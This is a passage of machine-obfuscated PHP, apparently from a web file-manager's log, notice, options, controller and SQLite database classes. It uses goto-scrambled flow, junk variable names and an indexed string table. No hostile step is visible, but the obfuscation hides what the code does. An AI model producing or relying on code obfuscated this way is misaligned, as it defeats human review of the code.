(isset($BËä´¾¦¬ò[$dºØºô¸×ô[714]])) { $dà—…øâ°Ğ = $BËä´¾¦¬ò[$dºØºô¸×ô[714]]; $eÙ´ğ‡àà§ = isset($BËä´¾¦¬ò[$dºØºô¸×ô[476]]) ? $BËä´¾¦¬ò[$dºØºô¸×ô[476]] : time(); $fŸî˜æ¡[$dºØºô¸×ô[194]] = array($dºØºô¸×ô[331], array($dà—…øâ°Ğ, $eÙ´ğ‡àà§)); } if ($BËä´¾¦¬ò[$dºØºô¸×ô[29]]) { $EËÎŞ»ÒÏ = explode($dºØºô¸×ô[47], $BËä´¾¦¬ò[$dºØºô¸×ô[29]]); $fó¨²êŠ£ = $this->typeFile(); $BÚ¸Äƒô÷ = array(); foreach ($EËÎŞ»ÒÏ as $cÌçùë³¦) { $BÚ¸Äƒô÷[] = $cÌçùë³¦; if (isset($fó¨²êŠ£[$cÌçùë³¦])) { $BÚ¸Äƒô÷ = array_merge($BÚ¸Äƒô÷, $fó¨²êŠ£[$cÌçùë³¦]); } } $BÚ¸Äƒô÷ = array_unique($BÚ¸Äƒô÷); if ($BÚ¸Äƒô÷) { $fŸî˜æ¡[$dºØºô¸×ô[29]] = array($dºØºô¸×ô[7], $BÚ¸Äƒô÷); } } else { $fŸî˜æ¡[$dºØºô¸×ô[29]] = array($dºØºô¸×ô[2087], $dºØºô¸×ô[2088]); } goto BŞÛ¶ô‚êÛ; Eõ‚’ŒÛ‡: $D÷âÑ«—°[$dºØºô¸×ô[367]] = $this->logList($D÷âÑ«—°[$dºØºô¸×ô[367]]); return $D÷âÑ«—°; goto e¿¦ä›ˆ„; e¿¦ä›ˆ„: } private function ipAddress(&$DÌ¸ÏÏ¸§) { $CªõÛ¢äù¾ =& $_SERVER[æ§›¦ÌáØ]; if (!empty($DÌ¸ÏÏ¸§[$CªõÛ¢äù¾[2086]])) { $eÑéÍ…«É = IpLocation::get($DÌ¸ÏÏ¸§[$CªõÛ¢äù¾[2086]]); } else { $eÑéÍ…«É = LNG($CªõÛ¢äù¾[2089]); } $DÌ¸ÏÏ¸§[$CªõÛ¢äù¾[2090]] = $eÑéÍ…«É; } private function descZipDownload($CÜ†œõÁ´¥, &$DĞ®Œ•†¶») { $aè„ÎÁ´’ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($CÜ†œõÁ´¥[$aè„ÎÁ´’[2091]])) { return; } $DÒÍ–”ÏËÉ = json_decode($CÜ†œõÁ´¥[$aè„ÎÁ´’[2091]], !0); foreach ($DÒÍ–”ÏËÉ as $CøšÄÃ§²Ó) { try { $A‘®ÇÉ¡ë§ = IO::infoFull($CøšÄÃ§²Ó[$aè„ÎÁ´’[76]]); } catch (Exception $cÂ‹²åõ÷î) { continue; } $CÜ†œõÁ´¥[$aè„ÎÁ´’[76]] = $CøšÄÃ§²Ó[$aè„ÎÁ´’[76]]; $DĞ®Œ•†¶»[] = $CÜ†œõÁ´¥[$aè„ÎÁ´’[395]] = $A‘®ÇÉ¡ë§[$aè„ÎÁ´’[395]]; $DĞ®Œ•†¶»[] = $CÜ†œõÁ´¥[$aè„ÎÁ´’[1902]] = $A‘®ÇÉ¡ë§[$aè„ÎÁ´’[478]]; break; } return $CÜ†œõÁ´¥; } private function getSourceList(&$A¾ó˜Ğ¾ª) { $DšŒÉ­ßñ˜ =& $_SERVER[æ§›¦ÌáØ]; $a©ÆäŞ¤í” = array(); foreach ($A¾ó˜Ğ¾ª as $fÃïÑ“­äê => $EÛŠˆŸø) { goto eˆ…ÚÙÅÍ—; a¸Ïé‰­ô²: $a©ÆäŞ¤í”[] = $C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[395]]; $a©ÆäŞ¤í”[] = $C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[1902]]; if ($C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[29]] == $DšŒÉ­ßñ˜[533]) { $a©ÆäŞ¤í”[] = $C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[431]][$DšŒÉ­ßñ˜[1045]]; $a©ÆäŞ¤í”[] = $C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[431]][$DšŒÉ­ßñ˜[1046]]; } goto CŞÜ¤ƒÆÛ; CŞÜ¤ƒÆÛ: if ($C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[29]] == $DšŒÉ­ßñ˜[1910]) { $a©ÆäŞ¤í”[] = $C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[431]][$DšŒÉ­ßñ˜[395]]; } goto eô¨©Ì´¸æ; eˆ…ÚÙÅÍ—: $C…Õ„‰’†Ò = json_decode($EÛŠˆŸø[$DšŒÉ­ßñ˜[431]], !0); if ($EÛŠˆŸø[$DšŒÉ­ßñ˜[29]] == $DšŒÉ­ßñ˜[1660]) { $C…Õ„‰’†Ò = $this->descZipDownload($C…Õ„‰’†Ò, $a©ÆäŞ¤í”); $A¾ó˜Ğ¾ª[$fÃïÑ“­äê][$DšŒÉ­ßñ˜[431]] = json_encode($C…Õ„‰’†Ò); continue; } if (strpos($EÛŠˆŸø[$DšŒÉ­ßñ˜[29]], $DšŒÉ­ßñ˜[1903]) !== 0) { if (!isset($C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[76]]) || strpos($EÛŠˆŸø[$DšŒÉ­ßñ˜[29]], $DšŒÉ­ßñ˜[2092]) !== 0) { continue; } try { $E¡çÇ‚¤œ = IO::infoFull($C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[76]]); } catch (Exception $cô·ˆÛˆ–ƒ) { continue; } $a©ÆäŞ¤í”[] = $C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[395]] = $E¡çÇ‚¤œ[$DšŒÉ­ßñ˜[395]]; $a©ÆäŞ¤í”[] = $C…Õ„‰’†Ò[$DšŒÉ­ßñ˜[1902]] = $E¡çÇ‚¤œ[$DšŒÉ­ßñ˜[478]]; $A¾ó˜Ğ¾ª[$fÃïÑ“­äê][$DšŒÉ­ßñ˜[431]] = json_encode($C…Õ„‰’†Ò); continue; } goto a¸Ïé‰­ô²; eô¨©Ì´¸æ: } if (!$a©ÆäŞ¤í”) { return array(); } return Model($DšŒÉ­ßñ˜[783])->sourceListInfo($a©ÆäŞ¤í”, !0); } private function logList($e¼ö··ƒÏš) { goto C˜ÕÕ†£éÏ; fÚî¬ ‡É: $e†ùªë¼µÆ = $this->getSourceList($e¼ö··ƒÏš); $f¥·öÁŠÆš = $this->typeAll(); $a¯ïñ’‡Ñ = array(); goto aŒ„çùÕê˜; aŒ„çùÕê˜: $fŞÊ¯­÷‹ = array(); foreach ($e¼ö··ƒÏš as $c¯©¡Çš×‰ => $C÷ÀŸèª¤) { goto d—‡šÙ¿Ò½; A½Î¾îÉÒ‚: $C÷ÀŸèª¤[$e™ ì®Èğˆ[28]] = isset($B‹‘ó½°á[$e™ ì®Èğˆ[28]]) ? $B‹‘ó½°á[$e™ ì®Èğˆ[28]] : LNG($e™ ì®Èğˆ[2089]); $C÷ÀŸèª¤[$e™ ì®Èğˆ[1952]] = isset($B‹‘ó½°á[$e™ ì®Èğˆ[1952]]) ? $B‹‘ó½°á[$e™ ì®Èğˆ[1952]] : $e™ ì®Èğˆ[33]; $C÷ÀŸèª¤[$e™ ì®Èğˆ[1423]] = isset($f¥·öÁŠÆš[$BèÔÔÉµğ]) ? $f¥·öÁŠÆš[$BèÔÔÉµğ] : $fêÃæœ°; goto fÔå«ˆ¢Ğî; fÔå«ˆ¢Ğî: $C÷ÀŸèª¤[$e™ ì®Èğˆ[1846]] = $B‹‘ó½°á; $BÍ„‚Öõ¼Ã = json_decode($C÷ÀŸèª¤[$e™ ì®Èğˆ[431]], !0); $C÷ÀŸèª¤[$e™ ì®Èğˆ[2086]] = isset($BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[2086]]) ? $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[2086]] : $e™ ì®Èğˆ[33]; goto EÓº«¿Ç©õ; a”êåÔîî£: unset($C÷ÀŸèª¤[$e™ ì®Èğˆ[2095]]); $a¯ïñ’‡Ñ[] = $C÷ÀŸèª¤; goto A”º÷’ˆœ; EÓº«¿Ç©õ: $this->ipAddress($C÷ÀŸèª¤); if (strpos($BèÔÔÉµğ, $e™ ì®Èğˆ[1903]) === 0 || isset($BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[1902]])) { goto cĞ·¨‹…È’; cĞ·¨‹…È’: $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[85]] = $e†ùªë¼µÆ[$BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[395]]]; $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[1915]] = $e†ùªë¼µÆ[$BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[1902]]]; if ($BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[29]] == $e™ ì®Èğˆ[533]) { $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[431]][$e™ ì®Èğˆ[1045]] = $e†ùªë¼µÆ[$BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[431]][$e™ ì®Èğˆ[1045]]]; $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[431]][$e™ ì®Èğˆ[1046]] = $e†ùªë¼µÆ[$BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[431]][$e™ ì®Èğˆ[1046]]]; } goto fËÎß¹¬Ì¼; fËÎß¹¬Ì¼: if ($BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[29]] == $e™ ì®Èğˆ[1910]) { $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[431]][$e™ ì®Èğˆ[395]] = $e†ùªë¼µÆ[$BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[431]][$e™ ì®Èğˆ[395]]]; } if ($BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[29]] == $e™ ì®Èğˆ[1655]) { $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[1915]] = $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[85]]; $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[1902]] = $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[1915]][$e™ ì®Èğˆ[395]]; $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[85]] = !1; $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[395]] = $e™ ì®Èğˆ[33]; } if ($BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[85]] && $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[85]][$e™ ì®Èğˆ[404]] == $e™ ì®Èğˆ[1161]) { $fŞÊ¯­÷‹[] = $C÷ÀŸèª¤[$e™ ì®Èğˆ[393]]; unset($e¼ö··ƒÏš[$c¯©¡Çš×‰]); continue; } goto A÷Ì¦ñùÈğ; A÷Ì¦ñùÈğ: if ($BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[1915]] && $BÍ„‚Öõ¼Ã[$e™ ì®Èğˆ[1915]][$e™ ì®Èğˆ[404]] == $e™ ì®Èğˆ[1161]) { $fŞÊ¯­÷‹[] = $C÷ÀŸèª¤[$e™ ì®Èğˆ[393]]; unset($e¼ö··ƒÏš[$c¯©¡Çš×‰]); continue; } goto a‰ÓŠŸáâ¯; a‰ÓŠŸáâ¯: } $C÷ÀŸèª¤[$e™ ì®Èğˆ[431]] = $BÍ„‚Öõ¼Ã; goto a”êåÔîî£; d—‡šÙ¿Ò½: $BèÔÔÉµğ = $C÷ÀŸèª¤[$e™ ì®Èğˆ[29]]; $B‹‘ó½°á = isset($C‡·‘ôÄĞ£[$C÷ÀŸèª¤[$e™ ì®Èğˆ[1520]]]) ? $C‡·‘ôÄĞ£[$C÷ÀŸèª¤[$e™ ì®Èğˆ[1520]]] : !1; $fêÃæœ° = strpos($BèÔÔÉµğ, $e™ ì®Èğˆ[2093]) === 0 ? LNG($e™ ì®Èğˆ[2094]) : LNG($e™ ì®Èğˆ[2089]); goto A½Î¾îÉÒ‚; A”º÷’ˆœ: } $this->clearSystemPathLog($fŞÊ¯­÷‹); goto b×ÜÑ‡¨»; b×ÜÑ‡¨»: return $a¯ïñ’‡Ñ; goto e¨„±¹‡‚µ; C˜ÕÕ†£éÏ: $e™ ì®Èğˆ =& $_SERVER[æ§›¦ÌáØ]; $A·¹«ô—ê¨ = array_to_keyvalue($e¼ö··ƒÏš, $e™ ì®Èğˆ[33], $e™ ì®Èğˆ[1520]); $C‡·‘ôÄĞ£ = Model($e™ ì®Èğˆ[519])->userListInfo(array_unique($A·¹«ô—ê¨)); goto fÚî¬ ‡É; e¨„±¹‡‚µ: } private function clearSystemPathLog($dÓ³Ÿ¯õõõ) { $C£İ£ˆ“³Ù =& $_SERVER[æ§›¦ÌáØ]; if (count($dÓ³Ÿ¯õõõ) == 0) { return; } $e›õëìÉ•â = array($C£İ£ˆ“³Ù[393] => array($C£İ£ˆ“³Ù[7], array_unique($dÓ³Ÿ¯õõõ))); $this->where($e›õëìÉ•â)->delete(); } public function deviceList($bß®²«ÏÓ, $Càö×ÈÂ‘ = 0) { $BÉÀºÄèùÉ =& $_SERVER[æ§›¦ÌáØ]; $FÁÙø¢Âç = array($BÉÀºÄèùÉ[1520] => $bß®²«ÏÓ, $BÉÀºÄèùÉ[194] => array($BÉÀºÄèùÉ[962], $Càö×ÈÂ‘), $BÉÀºÄèùÉ[29] => $BÉÀºÄèùÉ[1629]); $Cù¢µ¬ğ¼ = array(); $c½Ü²–§ÂÆ = $this->field($BÉÀºÄèùÉ[2096])->where($FÁÙø¢Âç)->order($BÉÀºÄèùÉ[1913])->limit(50)->select(); foreach ($c½Ü²–§ÂÆ as $fº’õæĞî => $eÕİìÕ¦öº) { goto E–ÛêíÕÇŞ; eÓË–ÖÉÕ: $this->ipAddress($eÕİìÕ¦öº); $eÕİìÕ¦öº[$BÉÀºÄèùÉ[431]] = $DÒÇ‚›²Ñ‘; $Cù¢µ¬ğ¼[$B¸•áÄ›ÃÙ] = $eÕİìÕ¦öº; goto bÍâ™“›Õ ; a›’·ù³¯˜: unset($DÒÇ‚›²Ñ‘[$BÉÀºÄèùÉ[2086]]); $B¸•áÄ›ÃÙ = $this->deviceType($DÒÇ‚›²Ñ‘[$BÉÀºÄèùÉ[1904]]); if (isset($Cù¢µ¬ğ¼[$B¸•áÄ›ÃÙ])) { continue; } goto eÓË–ÖÉÕ; E–ÛêíÕÇŞ: if ($fº’õæĞî > 0 && abs($eÕİìÕ¦öº[$BÉÀºÄèùÉ[194]] - $c½Ü²–§ÂÆ[$fº’õæĞî - 1][$BÉÀºÄèùÉ[194]]) < 5) { continue; } $DÒÇ‚›²Ñ‘ = json_decode($eÕİìÕ¦öº[$BÉÀºÄèùÉ[431]], !0); $eÕİìÕ¦öº[$BÉÀºÄèùÉ[2086]] = isset($DÒÇ‚›²Ñ‘[$BÉÀºÄèùÉ[2086]]) ? $DÒÇ‚›²Ñ‘[$BÉÀºÄèùÉ[2086]] : $BÉÀºÄèùÉ[33]; goto a›’·ù³¯˜; bÍâ™“›Õ : } return array_values($Cù¢µ¬ğ¼); } public function deviceType($Døšé®Şßä) { return $Døšé®Şßä; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x6e\157\x74\151\x63\145\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\x63\157\x6e\164\x65\156\x74", "\141\165\164\150", "\155\x6f\x64\x65", "\x74\151\155\x65", "\164\x79\160\145", "\x6c\x65\x76\145\154", "\x65\156\x61\x62\154\x65", "\x73\157\x72\x74"); public function listData($dÙù¼‚°•ö = false, $AÎ£†‹ÕÆ• = "\x73\x6f\x72\164", $F×½ˆ¼ŒØ… = false) { return parent::listData($dÙù¼‚°•ö, $AÎ£†‹ÕÆ•, $F×½ˆ¼ŒØ…); } public function add($BÁ°ë©óà¤) { $CÀ˜‰±¢¥ğ =& $_SERVER[æ§›¦ÌáØ]; $dƒª‘”¥½È = time(); if ($BÁ°ë©óà¤[$CÀ˜‰±¢¥ğ[12]] == $CÀ˜‰±¢¥ğ[2097]) { $dƒª‘”¥½È = strtotime($BÁ°ë©óà¤[$CÀ˜‰±¢¥ğ[197]]); } $BÁ°ë©óà¤[$CÀ˜‰±¢¥ğ[197]] = $dƒª‘”¥½È; return parent::insert($BÁ°ë©óà¤); } public function update($E´ç†‰¼çÒ, $BâÙÚõµ°) { goto cŒË°¢Ÿâ; d©¨£Äé‘æ: return parent::update($E´ç†‰¼çÒ, $BâÙÚõµ°); goto aœÁ¯ç¹; cŒË°¢Ÿâ: $d…ğöƒ¶Ğ± =& $_SERVER[æ§›¦ÌáØ]; $a…ŠÛÜù… = $this->listData($E´ç†‰¼çÒ); if (!$a…ŠÛÜù…) { return !1; } goto fñ¯Ô¶ä¾Î; fñ¯Ô¶ä¾Î: $AÒšÇ‹¨Û’ = time(); if ($BâÙÚõµ°[$d…ğöƒ¶Ğ±[12]] == $d…ğöƒ¶Ğ±[2097]) { $AÒšÇ‹¨Û’ = strtotime($BâÙÚõµ°[$d…ğöƒ¶Ğ±[197]]); } $BâÙÚõµ°[$d…ğöƒ¶Ğ±[197]] = $AÒšÇ‹¨Û’; goto d©¨£Äé‘æ; aœÁ¯ç¹: } public function remove($e¢Áåà»š) { $f¨åÂƒ­ƒ¡ = $this->listData($e¢Áåà»š); if (!$f¨åÂƒ­ƒ¡ || $f¨åÂƒ­ƒ¡[$_SERVER[æ§›¦ÌáØ][1161]]) { return !1; } return parent::remove($e¢Áåà»š); } public function sort($e£©¬¾Â¡ã, $aÏ‡ØªØŞ¬) { return parent::update($e£©¬¾Â¡ã, $aÏ‡ØªØŞ¬); } public function enable($f”ÄÙÁñë, $cø‘ÛÂÑ†ù) { return parent::update($f”ÄÙÁñë, array($_SERVER[æ§›¦ÌáØ][2098] => $cø‘ÛÂÑ†ù)); } private function initUserOption() { $aæãÄŠÌŠ” =& $_SERVER[æ§›¦ÌáØ]; $this->optionType = $aæãÄŠÌŠ”[2099]; $this->modelType = $aæãÄŠÌŠ”[2100]; $this->field = array($aæãÄŠÌŠ”[2101], $aæãÄŠÌŠ”[28], $aæãÄŠÌŠ”[197], $aæãÄŠÌŠ”[29], $aæãÄŠÌŠ”[2102], $aæãÄŠÌŠ”[703], $aæãÄŠÌŠ”[189]); } public function userNoticeGet($Bœ‡¥ìòÍ™ = false) { $this->initUserOption(); return parent::listData($Bœ‡¥ìòÍ™, $_SERVER[æ§›¦ÌáØ][393], !0); } public function userNoticeAdd($c±‡Öï´‚ø) { $FÄÌ“Óîí =& $_SERVER[æ§›¦ÌáØ]; $this->initUserOption(); $BÛäÃ‚¢Ì¶ = $this->findByKey($FÄÌ“Óîí[2101], $c±‡Öï´‚ø[$FÄÌ“Óîí[393]]); if ($BÛäÃ‚¢Ì¶) { return !0; } $DÑ½Ï‰®™‡ = array($FÄÌ“Óîí[2101] => $c±‡Öï´‚ø[$FÄÌ“Óîí[393]], $FÄÌ“Óîí[28] => $c±‡Öï´‚ø[$FÄÌ“Óîí[28]], $FÄÌ“Óîí[197] => $c±‡Öï´‚ø[$FÄÌ“Óîí[197]], $FÄÌ“Óîí[29] => isset($c±‡Öï´‚ø[$FÄÌ“Óîí[29]]) ? $c±‡Öï´‚ø[$FÄÌ“Óîí[29]] : 1, $FÄÌ“Óîí[2102] => isset($c±‡Öï´‚ø[$FÄÌ“Óîí[2102]]) ? $c±‡Öï´‚ø[$FÄÌ“Óîí[2102]] : 0, $FÄÌ“Óîí[703] => 0, $FÄÌ“Óîí[189] => 0); return parent::insert($DÑ½Ï‰®™‡); } public function userNoticeEdit($Eô¼˜™â×, $Bá†ÆÑİŠö) { $this->initUserOption(); return parent::update($Eô¼˜™â×, $Bá†ÆÑİŠö); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\x65\155\137\x6f\160\164\151\x6f\156"; protected $jsonField = array("\155\x65\156\165", "\x72\x6f\154\x65", "\x72\x6f\154\145\x47\162\157\165\160", "\162\145\147\x69\x73\164", "\x65\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($E ÔĞçîÌ) { return "\x53\171\x73\x74\145\x6d\x4f\160\164\151\x6f\x6e\137{$E ÔĞçîÌ}"; } protected function optionDefault($b¤„‡®ó×‡ = '') { $Cåğ‘¡©ãé =& $_SERVER[æ§›¦ÌáØ]; if ($b¤„‡®ó×‡ == $Cåğ‘¡©ãé[33]) { return $GLOBALS[$Cåğ‘¡©ãé[6]][$Cåğ‘¡©ãé[378]]; } } } goto Fİ¿ÜÖ•ë„; Cî‘äÙ¸´š: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e—„ö«™µ ; e—„ö«™µ : $d¹¸†±¾é =& $_SERVER[æ§›¦ÌáØ]; global $in, $config; $this->config =& $config; goto A™˜‚ãï»á; A™˜‚ãï»á: $this->in =& $in; $this->values[$d¹¸†±¾é[6]] =& $config; $this->values[$d¹¸†±¾é[7]] =& $in; goto FÉ‘áš¬ïÑ; FÉ‘áš¬ïÑ: $this->tpl = TEMPLATE . MOD . $d¹¸†±¾é[8]; $this->_classObjectID = mt_rand(0, 10000); goto A²»ø‚¬; A²»ø‚¬: } public function loadClass($BŠÇ˜ê°ğ˜) { if (1 === func_num_args()) { $this->{$BŠÇ˜ê°ğ˜} = new $BŠÇ˜ê°ğ˜(); } else { $a‘‡ÙºÕŸ = new ReflectionClass($BŠÇ˜ê°ğ˜); $f›ãõ°Ğì = func_get_args(); array_shift($f›ãõ°Ğì); $this->{$BŠÇ˜ê°ğ˜} = $a‘‡ÙºÕŸ->newInstanceArgs($f›ãõ°Ğì); } return $this->{$BŠÇ˜ê°ğ˜}; } protected function assign($cì¡ßÂÓ× , $E´è„¶¸ä) { $this->values[$cì¡ßÂÓ× ] = $E´è„¶¸ä; } protected function display($a¼À¥ö×ï) { ob_end_clean(); extract($this->values); require $this->tpl . $a¼À¥ö×ï; } } class DbSqliteBase extends Db { public function __construct($Eôéğ¾ƒÎÄ = '') { $d®£ÉÛİï‹ =& $_SERVER[æ§›¦ÌáØ]; if (!extension_loaded($d®£ÉÛİï‹[9])) { think_exception(think_lang($d®£ÉÛİï‹[10]) . $d®£ÉÛİï‹[11]); } if (!empty($Eôéğ¾ƒÎÄ)) { if (!isset($Eôéğ¾ƒÎÄ[$d®£ÉÛİï‹[12]])) { $Eôéğ¾ƒÎÄ[$d®£ÉÛİï‹[12]] = 438; } $this->config = $Eôéğ¾ƒÎÄ; if (empty($this->config[$d®£ÉÛİï‹[13]])) { $this->config[$d®£ÉÛİï‹[13]] = array(); } } } public function connect($d×»Úá½Œ = '', $d¸‰¤Ù¶·å = 0) { $dïŠ‹ŸŸ’ˆ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($this->linkID[$d¸‰¤Ù¶·å])) { goto aÃ»À×‹‚; aÈ‚¨»¼²Ë: @sqlite_busy_timeout($this->linkID[$d¸‰¤Ù¶·å], 30000); if (1 != think_config($dïŠ‹ŸŸ’ˆ[18])) { unset($this->config); } goto fØë˜°äİ÷; dÉÚµÏãÅí: $this->linkID[$d¸‰¤Ù¶·å] = $B¤­­‹ç‰Ù($d×»Úá½Œ[$dïŠ‹ŸŸ’ˆ[17]], $d×»Úá½Œ[$dïŠ‹ŸŸ’ˆ[12]]); if (!$this->linkID[$d¸‰¤Ù¶·å]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto aÈ‚¨»¼²Ë; aÃ»À×‹‚: if (empty($d×»Úá½Œ)) { $d×»Úá½Œ = $this->config; } $fÃÔ®Ë¢’ = !empty($d×»Úá½Œ[$dïŠ‹ŸŸ’ˆ[13]][$dïŠ‹ŸŸ’ˆ[14]]) ? $d×»Úá½Œ[$dïŠ‹ŸŸ’ˆ[13]][$dïŠ‹ŸŸ’ˆ[14]] : $this->pconnect; $B¤­­‹ç‰Ù = $fÃÔ®Ë¢’ ? $dïŠ‹ŸŸ’ˆ[15] : $dïŠ‹ŸŸ’ˆ[16]; goto dÉÚµÏãÅí; fØë˜°äİ÷: } return $this->linkID[$d¸‰¤Ù¶·å]; } public function free() { $this->queryID = null; } public function query($b¢ÃåÎ¦è´) { goto DëàˆàŒ—Á; E¼æŸ¹„Ç : think_status($dÚ¸Æ¶ÍÜ[20]); $this->queryID = sqlite_query($this->_linkID, $b¢ÃåÎ¦è´); $this->debug(); goto Bç¿‰èì“£; Bç¿‰èì“£: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $F¯ÃÀ±÷±‘ = $this->getAll(); return $F¯ÃÀ±÷±‘; } goto f¦’¢Ø‚ó; DëàˆàŒ—Á: $dÚ¸Æ¶ÍÜ =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B§³ÃÜÃ­°; B§³ÃÜÃ­°: $this->queryStr = $b¢ÃåÎ¦è´; if ($this->queryID) { $this->free(); } think_action_status($dÚ¸Æ¶ÍÜ[19], 1); goto E¼æŸ¹„Ç ; f¦’¢Ø‚ó: } public function execute($d™·ò¢ŠË) { goto c¤â‰Âî¡í; f²ëê¯é‚ø: if (!1 === $AÖ±ŞÔÍÑç) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aïòÕæêó; aºÀ°Ç÷¦Û: think_status($E–°Ãõ·…[20]); $AÖ±ŞÔÍÑç = sqlite_exec($this->_linkID, $d™·ò¢ŠË); $this->debug(); goto f²ëê¯é‚ø; Eìã½Ú·‡à: $this->queryStr = $d™·ò¢ŠË; if ($this->queryID) { $this->free(); } think_action_status($E–°Ãõ·…[21], 1); goto aºÀ°Ç÷¦Û; c¤â‰Âî¡í: $E–°Ãõ·… =& $_SERVER[æ§›¦ÌáØ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eìã½Ú·‡à; aïòÕæêó: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[æ§›¦ÌáØ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a–·Âòœå¬ = sqlite_query($this->_linkID, $_SERVER[æ§›¦ÌáØ][23]); if (!$a–·Âòœå¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bšëá—¼Ùİ = sqlite_query($this->_linkID, $_SERVER[æ§›¦ÌáØ][24]); if (!$Bšëá—¼Ùİ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D‚”²¡Ú = array(); if ($this->numRows > 0) { for ($EŒÚ¬¥‹¢¬ = 0; $EŒÚ¬¥‹¢¬ < $this->numRows; $EŒÚ¬¥‹¢¬++) { $D‚”²¡Ú[$EŒÚ¬¥‹¢¬] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $D‚”²¡Ú; } public function getFields($eÄ„¨îñê¥) { $FÓÄµô‘Ñ½ =& $_SERVER[æ§›¦ÌáØ]; $A´¡îÁ¤ø = $this->query($FÓÄµô‘Ñ½[25] . $eÄ„¨îñê¥ . $FÓÄµô‘Ñ½[26]); $F¬À±Ö¤Ö¬ = array(); if ($A´¡îÁ¤ø) { foreach ($A´¡îÁ¤ø as $B¦•ÙªØÍ„ => $C‹ ˆ£µ) { $F¬À±Ö¤Ö¬[$C‹ ˆ£µ[$FÓÄµô‘Ñ½[27]]] = array($FÓÄµô‘Ñ½[28] => $C‹ ˆ£µ[$FÓÄµô‘Ñ½[27]], $FÓÄµô‘Ñ½[29] => $C‹ ˆ£µ[$FÓÄµô‘Ñ½[30]], $FÓÄµô‘Ñ½[31] => (bool) ($C‹ ˆ£µ[$FÓÄµô‘Ñ½[32]] === $FÓÄµô‘Ñ½[33]), $FÓÄµô‘Ñ½[34] => $C‹ ˆ£µ[$FÓÄµô‘Ñ½[35]], $FÓÄµô‘Ñ½[36] => strtolower($C‹ ˆ£µ[$FÓÄµô‘Ñ½[37]]) == $FÓÄµô‘Ñ½[38], $FÓÄµô‘Ñ½[39] => strtolower($C‹ ˆ£µ[$FÓÄµô‘Ñ½[40]]) == $FÓÄµô‘Ñ½[41]); } } return $F¬À±Ö¤Ö¬; } public function getTables($dÂÄ¾Ì÷ëó = '') { $DëÒ²Ÿ†šÇ =& $_SERVER[æ§›¦ÌáØ]; $eÌºÈ“ß„½ = $this->query($DëÒ²Ÿ†šÇ[42] . $DëÒ²Ÿ†šÇ[43] . $DëÒ²Ÿ†šÇ[44]); $fóÔ·´¦îğ = array(); foreach ($eÌºÈ“ß„½ as $aËÎ™ÇÈÌä => $eÑÈÄ¼±ÙÄ) { $fóÔ·´¦îğ[$aËÎ™ÇÈÌä] = current($eÑÈÄ¼±ÙÄ); } return $fóÔ·´¦îğ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $CÃ±ÄÔŠÒ =& $_SERVER[æ§›¦ÌáØ]; $b¾¥ãŒ£Ø˜ = sqlite_last_error($this->_linkID); $this->error = $b¾¥ãŒ£Ø˜ . $CÃ±ÄÔŠÒ[4] . sqlite_error_string($b¾¥ãŒ£Ø˜); if ($CÃ±ÄÔŠÒ[33] != $this->queryStr) { $this->error .= LNG($CÃ±ÄÔŠÒ[45]) . $this->queryStr; } think_trace($this->error, $CÃ±ÄÔŠÒ[33], $CÃ±ÄÔŠÒ[46]); return $this->error; } public function escapeString($d–¶“›ƒç) { return sqlite_escape_string($d–¶“›ƒç); } public function parseLimit($Bôœ¡äŠ²ë) { 